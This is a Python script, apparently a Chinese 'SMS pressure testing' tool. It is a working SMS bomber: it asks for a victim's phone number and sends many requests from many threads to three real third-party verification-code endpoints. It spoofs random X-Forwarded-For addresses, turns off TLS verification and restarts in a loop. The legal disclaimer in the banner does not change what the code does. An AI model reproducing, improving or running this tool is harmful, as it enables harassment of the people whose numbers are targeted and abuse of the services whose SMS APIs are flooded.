import sys, subprocess, time, random, threading, base64, os

# --- 环境自愈：自动补齐组件 ---
def auto_setup():
    for pkg in ["requests", "urllib3"]:
        try:
            __import__(pkg)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

auto_setup()

import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- 开发者身份 & 严正声明 ---
# ✈️ TG@NL78991
def print_banner():
    # 修复编码报错，直接使用硬编码字符串
    print("="*60)
    print("🚀 开发者: 奶龙 | 联系方式(飞机): TG@NL78991")
    print("🔥 奶龙智能高速短信测压机 v10.0")
    print("-" * 60)
    print("【法律免责声明】")
    print("本程序仅供开发者进行接口压力测试及合规技术研究使用。")
    print("严禁利用本工具从事任何形式的非法骚扰、恶意破坏等违法犯罪活动。")
    print("相关法律法规提示：")
    print("1. 《中华人民共和国治安管理处罚法》第四十二条：多次发送侮辱、恐吓或者其他信息，")
    print("   干扰他人正常生活的，处五日以下拘留或者五百元以下罚款。")
    print("2. 《中华人民共和国刑法》第二百八十五条：非法获取计算机信息系统数据罪。")
    print("请用户严格自律，非法使用产生的一切法律后果由使用者本人承担。")
    print("="*60)

class NL_Turbo_Engine:
    def __init__(self, phone):
        self.phone = phone
        self.stats = {"success": 0, "fail": 0, "start_time": 0}
        self.lock = threading.Lock()
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=500, pool_maxsize=500)
        self.session.mount('https://', adapter)

    def _get_api_config(self, idx):
        configs = [
            ("云创动力", "https://jkyc.necloud.com.cn/QXRTOC/user/qxrtoc_wxxcxUserRegistCode", {"phone": self.phone}),
            ("小熊美术", "https://www.xiaoxiongmeishu.com/api/m/v1/sms/sendCodeV2", {"bizOrigin": "APP", "mobile": f"+86{self.phone}"}),
            ("供应管理", "https://www.scmmgr.cn/scm//orderRegisterUser/getPollCode", {"mobileNo": self.phone, "msgType": "2"})
        ]
        return configs[idx % 3]

    def _execute(self, index):
        node_name, url, payload = self._get_api_config(index)
        # 模拟高匿指纹
        fingerprint = f"NL-{random.randint(1000, 9999)}"
        headers = {
            "User-Agent": f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}) NL-Engine/10.0",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        
        try:
            # 统一请求逻辑
            if "json" in str(payload):
                r = self.session.post(url, json=payload, headers=headers, timeout=8, verify=False)
            else:
                r = self.session.post(url, data=payload, headers=headers, timeout=8, verify=False)
            
            success = (r.status_code == 200)
            tag = "✅" if success else "❌"
            with self.lock:
                if success: self.stats["success"] += 1
                else: self.stats["fail"] += 1
            
            print(f"[{index:03d}] {tag} 节点:[{node_name:<6}] | 指纹:[{fingerprint}] | 状态:{r.status_code}")
        except:
            with self.lock: self.stats["fail"] += 1
            print(f"[{index:03d}] ⚠️ 节点:[{node_name:<6}] | 链路阻塞")

    def run(self, total, threads):
        self.stats = {"success": 0, "fail": 0, "start_time": time.time()}
        print(f"\n[🚀 引擎全功率启动] 目标:{self.phone} | 线程负载:{threads}\n" + "-"*55)
        
        with ThreadPoolExecutor(max_workers=threads) as ex:
            list(ex.map(self._execute, range(1, total + 1)))
        
        self.show_summary(total)

    def show_summary(self, total):
        end_time = time.time()
        duration = end_time - self.stats["start_time"]
        success = self.stats["success"]
        qps = success / duration if duration > 0 else 0
        rate = (success / total) * 100
        
        print("\n" + "📊" + " 奶龙测压数据总结汇报 " + "📊")
        print("=" * 45)
        print(f"● 测压目标: {self.phone:>20}")
        print(f"● 任务总量: {total:>20}")
        print(f"● 成功击穿: {success:>20}")
        print(f"● 链路拦截: {self.stats['fail']:>20}")
        print(f"● 综合胜率: {rate:>19.2f}%")
        print(f"● 瞬时QPS: {qps:>19.2f} 条/秒")
        print(f"● 执行耗时: {duration:>19.2f} 秒")
        print("=" * 45)

def main():
    print_banner()
    phone = input("📱 输入测压目标(手机号): ").strip()
    
    total_raw = input("🎯 输入预发送总量: ").strip()
    total = int(total_raw) if total_raw.isdigit() else 100
    
    print("\n[🤖 负载调节模式] [A]智能填写 (最快/最稳) | [M]手动输入")
    mode = input("请选择模式: ").lower()
    if mode == 'a':
        # 智能算法：平衡带宽与设备性能
        threads = int((total ** 0.5) * 2.5)
        threads = max(10, min(threads, 120))
        print(f"⚙️ 奶龙智能算法已介入，自动优化并发数为: {threads}")
    else:
        threads = int(input("请输入并发线程数: "))

    engine = NL_Turbo_Engine(phone)
    
    while True:
        engine.run(total, threads)
        
        print("\n" + "🛠️ " * 10)
        print(" [1] 修改参数重新开始")
        print(" [3] 彻底结束进程并退出")
        print("🛠️ " * 10)
        
        user_input = {'data': None}
        def get_input(container):
            container['data'] = sys.stdin.readline().strip()
        
        t = threading.Thread(target=get_input, args=(user_input,))
        t.daemon = True
        t.start()
        
        should_restart = True
        for i in range(10, 0, -1):
            if user_input['data'] is not None:
                if user_input['data'] == '3':
                    print("\n[🛡️ 奶龙卫士] 正在切断加密链路... 进程已安全终结。")
                    os._exit(0) # 暴力退出，解决倒计时重启Bug
                elif user_input['data'] == '1':
                    phone = input("\n新目标手机号: ").strip()
                    engine = NL_Turbo_Engine(phone)
                    should_restart = True
                    break
            
            sys.stdout.write(f"\r⏳ 任务待命倒计时: {i:02d}s (输入3结束进程) ")
            sys.stdout.flush()
            time.sleep(1)
        
        if should_restart and (user_input['data'] != '1'):
            print("\n\n[🔄 自动补给] 奶龙正在为你重载全链路节点...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        os._exit(0)
